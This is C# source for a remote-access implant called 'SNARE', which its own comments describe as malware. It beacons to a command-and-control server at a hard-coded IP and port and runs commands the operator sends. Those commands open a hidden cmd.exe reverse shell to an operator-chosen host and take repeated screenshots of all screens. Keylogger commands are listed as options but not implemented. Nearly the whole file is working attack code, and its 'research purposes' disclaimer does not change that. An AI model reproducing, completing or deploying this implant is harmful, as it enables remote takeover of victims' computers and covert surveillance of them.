using System;
using System.Collections.Generic;
using System.ComponentModel.DataAnnotations;
using System.Diagnostics;
using System.IO;
using System.Net.Mime;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Xml.Serialization;
using System.Runtime.InteropServices;
using System.Drawing;
using System.Drawing.Imaging;
using System.Media;
using System.Windows.Forms;
using System.Windows;
using System.Windows.Forms.VisualStyles;

// Sure Not Another Rancid Executable
namespace SnareNetStd
{
    class Program
    {
        //From https://stackoverflow.com/questions/27987085/screen-resolution-not-matching-screen-bounds
        private enum ProcessDPIAwareness
        {
            ProcessDPIUnaware = 0,
            ProcessSystemDPIAware = 1,
            ProcessPerMonitorDPIAware = 2
        }

        [DllImport("shcore.dll")]
        private static extern int SetProcessDpiAwareness(ProcessDPIAwareness value);

        private static void SetDpiAwareness()
        {
            try
            {
                if (Environment.OSVersion.Version.Major >= 6)
                {
                    SetProcessDpiAwareness(ProcessDPIAwareness.ProcessPerMonitorDPIAware);
                }
            }
            catch (EntryPointNotFoundException)//this exception occures if OS does not implement this API, just ignore it.
            {
            }
        }

        static void Main(string[] args)
        {
            SetDpiAwareness();
            Console.WriteLine("SNARE - Surely Not Another Rancid Executable");
            Console.WriteLine("No license required, no liability accepted if something goes wrong.");
            Console.WriteLine("Created for demo and research purpsoes, don't do anything bad with it.");
            Console.WriteLine("Connecting to C2");

            C2Connection c2 = new C2Connection("192.168.0.105", 1337);
            // While loop which allows for beconing.
            while (true)
            {
                try
                {
                    c2.setup();
                }
                catch (Exception e)
                {
                    Console.WriteLine("Connection Refused By C2");
                    Console.WriteLine("Waiting before reconnecting");
                    System.Threading.Thread.Sleep(5000);
                    continue;
                }

                while (true)
                {

                    if (c2.exitState)
                    {
                        System.Environment.Exit(0);
                    }

                    if (c2.waitState)
                    {
                        break;
                    }

                    c2.fetchCommand();


                }
                c2.tearDown();
                System.Threading.Thread.Sleep(5000);
            }

        }
    }

    class C2Connection
    {
        private string c2ip;
        // Setting this to avoid an IDE warning. Should never be port 0 anyway.
        private Int32 c2port = 0;
        // Setting these here because I'm using them at the class level, rather than trying to throw them between functions.
        private TcpClient c2Client;
        private NetworkStream c2Stream;
        private List<String> commands = new List<string>();

        // Can't believe I'm doing this... probably not the best way to do this.
        // Tells the main loop above if we should drop connection and re-initiate (wait)
        public bool waitState = false;
        // Or tells the main loop that we should stop running.
        public bool exitState = false;

        

        public C2Connection(string ip, Int32 port)
        {
            c2ip = ip;
            c2port = port;

            commands.Add("rev");
            commands.Add("kle");
            commands.Add("kld");
            commands.Add("klf");
            commands.Add("ssta");
            commands.Add("sstp");
            commands.Add("test");
            commands.Add("wait");
            commands.Add("shutdown");
        }

        // Function to set up the TCP communication for our piece of malware.
        public void setup()
        {
            // Checks if things have been set up properly.
            // Namely that the IP and port are properly set.
            if (c2ip != null || c2port != 0)
            {
                // Create our client and stream for passing data.
                Console.WriteLine("Attempting connection to c2 server.");
                try
                {
                    c2Client = new TcpClient(c2ip, c2port);
                    c2Stream = c2Client.GetStream();
                }
                catch (SocketException e)
                {
                    Console.WriteLine("C2 Connection Error");
                    throw new C2ConnectionException("Could not connect to C2 server.");
                }
            }
            else
            {
                Console.WriteLine("Uh oh, looks like no IP or port was set for connecting to C2");
            }
        }

        // Send a message to the server.
        public String sendMessage(String message)
        {
            Byte[] messageData = System.Text.Encoding.ASCII.GetBytes(message);
            c2Stream.Write(messageData, 0, messageData.Length);
            Byte[] responseData = new Byte[256];
            String response = String.Empty;
            Int32 bytes = c2Stream.Read(responseData, 0, responseData.Length);
            response = System.Text.Encoding.ASCII.GetString(responseData, 0, bytes);

            return response as String;
        }

        // Fetch something to do from the server.
        public void fetchCommand()
        {
            while (true)
            {
                String options = "SNARE Controller Requesting Command, My Lord!\n"
                                 + "Reverse Shell (rev)\n"
                                 + "Keylogger enable (kle)\n"
                                 + "Keylogger disable (kld)\n"
                                 + "Fetch keylogger events (klf)\n"
                                 + "Screenshots start (ssta)\n"
                                 + "Screenshots stop (sstp)\n"
                                 + "Test state (test)\n"
                                 + "Wait and reconnect (wait)\n"
                                 + "Shutdown (shutdown)\n";
                Byte[] optionsBytes = System.Text.Encoding.ASCII.GetBytes(options);
                c2Stream.Write(optionsBytes, 0, optionsBytes.Length);
                Byte[] responseData = new Byte[256];
                String response = String.Empty;
                Int32 bytes = c2Stream.Read(responseData, 0, responseData.Length);
                response = System.Text.Encoding.ASCII.GetString(responseData, 0, bytes);
                String command = parseCommand(response.Trim());
                if (command == "nc")
                {
                    Console.WriteLine("Invalid Command, looping back around");
                    continue;
                }
                runCommand(command);
                break;
            }

        }

        public String parseCommand(String command)
        {
            // Check if the returned command string is valid. if not error out.
            // Can shorten with checking list contents or .any
            foreach (String cmd in commands)
            {
                if (cmd.Contains(command))
                {
                    return command;
                }
            }
            // nc = No Command, ie nothing was found as a valid command.
            Console.WriteLine("Invalid command entered");
            return "nc";
        }

        public void runCommand(String command)
        {
            if (command == "test")
            {
                Console.WriteLine("Sending test message to server, will print response.");
                String response = sendMessage("Testing Interaction with C2 Server\n");
                Console.WriteLine("Recieved: {0}", response);
            }

            if (command == "wait")
            {
                waitState = true;
            }

            if (command == "shutdown")
            {
                exitState = true;
            }

            if (command == "rev")
            {
                String ipPrompt = "IP:Port for Connection\n";
                Byte[] promptMsg = System.Text.Encoding.ASCII.GetBytes(ipPrompt);
                c2Stream.Write(promptMsg, 0, promptMsg.Length);
                Byte[] responseData = new Byte[256];
                String response = String.Empty;
                Int32 bytes = c2Stream.Read(responseData, 0, responseData.Length);
                response = System.Text.Encoding.ASCII.GetString(responseData, 0, bytes);
                String[] ipPort = response.Trim().Split(':');
                String ip = ipPort[0];
                Int32 port;
                Int32.TryParse(ipPort[1], out port);
                Console.WriteLine("Recieved {0} {1}", ip, port.ToString());
                Thread reverseShellThread = new Thread(() => reverseShell(ip, port));
                reverseShellThread.Start();
            }

            if (command == "ssta")
            {
                
                Thread screenShotThread = new Thread(() => screenShotThreading());
                screenShotThread.Start();
            }
        }

        void screenShotThreading()
        {
            while (true)
            {
                Console.WriteLine("Taking Screenshot");
                screenShotAllScreens();
                System.Threading.Thread.Sleep(10000);
            }
        }

        void screenShotAllScreens()
        {
            foreach (var screen in Screen.AllScreens)
            {
                Console.WriteLine($"ID {screen.DeviceName}");
                Console.WriteLine($"Height {screen.Bounds.Height} Width {screen.Bounds.Width}");
                Console.WriteLine($"Top {screen.Bounds.Top} Bottom {screen.Bounds.Bottom}");
                Console.WriteLine($"Left {screen.Bounds.Left} Right {screen.Bounds.Right}");
                Console.WriteLine($"X {screen.Bounds.X} Y {screen.Bounds.Y}");



                // From https://www.codeproject.com/Tips/817001/Saving-a-screenshot-using-Csharp-A-K-A-Console-Mon
                // Hackily altered by meee
                Console.WriteLine("Taking screenshot...");
                Int32 TLX = screen.Bounds.X; //TL = top left
                Int32 TLY = screen.Bounds.Y; //TL = top left
                Bitmap memoryImage;
                memoryImage = new Bitmap(screen.Bounds.Width, screen.Bounds.Height);
                Size s = new Size(memoryImage.Width, memoryImage.Height);

                Graphics memoryGraphics = Graphics.FromImage(memoryImage);

                memoryGraphics.CopyFromScreen(TLX, TLY, 0, 0, s);

                //That's it! Save the image in the directory and this will work like charm.
                string fileName = string.Format(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) +
                                                @"\ss\" + screen.DeviceName.Replace('/', '_') + "_" +
                                                DateTime.Now.ToString("(dd_MMMM_hh_mm_ss_tt)") + ".png");

                // save it
                memoryImage.Save(fileName);

                // Write the message,
                Console.WriteLine("Picture has been saved...");
                // Pause the program to show the message.

            }
        }

        private void reverseShell(String ip, Int32 port)
        {
            // Checks if things have been set up properly.
            // Namely that the IP and port are properly set.
            if (ip != null || port < 1)
            {



                // Create our client and stream for passing data.
                Console.WriteLine("Attempting connection to reverse shell reciever.");
                try
                {
                    // Set up our TCP client to talk to the reverse shell reciever (seperate from the C2 server, can be on the same box).
                    TcpClient revClient = new TcpClient(ip, port);
                    Stream revStream = revClient.GetStream();
                    StreamReader revStrmRdr = new StreamReader(revStream);
                    StreamWriter revStrmWtr = new StreamWriter(revStream);
                    StringBuilder revStrInput = new StringBuilder();

                    // Setup the piping to cmd.exe
                    Process shell = new Process();
                    shell.StartInfo.FileName = "cmd.exe";
                    shell.StartInfo.CreateNoWindow = true;
                    shell.StartInfo.UseShellExecute = false;
                    shell.StartInfo.RedirectStandardError = true;
                    shell.StartInfo.RedirectStandardInput = true;
                    shell.StartInfo.RedirectStandardOutput = true;
                    // Set up a handler to handle output from CMD back in to our stream, which will make it back to the reverse shell reciever.
                    shell.OutputDataReceived += new DataReceivedEventHandler(reverseShellOutputHandler);

                    // Handles response events from the reverse shell process.
                    void reverseShellOutputHandler(object sendingProcess, DataReceivedEventArgs outputLine)
                    {
                        StringBuilder strOutput = new StringBuilder();

                        if (!String.IsNullOrEmpty(outputLine.Data))
                        {
                            try
                            {
                                // Takes piped data from cmd.exe (via stdOut) and writes it to the stream writer hooked up to the socket.
                                strOutput.Append(outputLine.Data);
                                revStrmWtr.WriteLine(strOutput);
                                revStrmWtr.Flush();
                            }
                            catch (Exception err) { }
                        }
                    }

                    Console.WriteLine("Beginning Reverse Shell");
                    shell.Start();
                    shell.BeginOutputReadLine();
                    while (true)
                    {
                        // If this is true CMD has exited.
                        bool shellExit = false;
                        // Read a line from the socket input.
                        revStrInput.Append(revStrmRdr.ReadLine());
                        // Display said line for debugging purposes.
                        Console.WriteLine(revStrInput.ToString().Trim());
                        // If the input from the socket/reciever was "exit" then cmd.exe is going to close once we pass it the input.
                        // So set shellexit to be true.
                        if (revStrInput.ToString().Trim() == "exit")
                        {
                            shellExit = true;
                        }
                        shell.StandardInput.WriteLine(revStrInput);
                        // Clear our stringbuilding
                        revStrInput.Remove(0, revStrInput.Length);
                        // If cmd.exe has exited then we are good 2 go and can exit this loop, return us to normal operation.
                        if (shellExit)
                        {
                            break;
                        }
                    }

                    // Done. Close all our junk.
                    revStrmWtr.Close();
                    revStrmRdr.Close();
                    revStream.Close();
                    revClient.Close();
                    Console.WriteLine("Reverse shell finished.");
                }
                catch (SocketException e)
                {
                    Console.WriteLine("Connection Error");
                    throw new C2ConnectionException("Could not connect to reverse shell reciever.");
                }
            }
            else
            {
                Console.WriteLine("Uh oh, looks like no IP or port was set for connecting to C2");
            }
        }



        // Finally close stuff we don't need.
        public void tearDown()
        {
            c2Stream.Close();
            c2Client.Close();
            waitState = false;
            exitState = false;
        }

        // If the connection fails...
        public class C2ConnectionException : Exception
        {
            public C2ConnectionException()
            {
            }

            public C2ConnectionException(String message) : base(message)
            {
            }
        }

        //If the command is invalid
        public class C2InvalidCommandException : Exception
        {
            public C2InvalidCommandException()
            {

            }

            public C2InvalidCommandException(String message) : base(message)
            {

            }
        }
    }
}
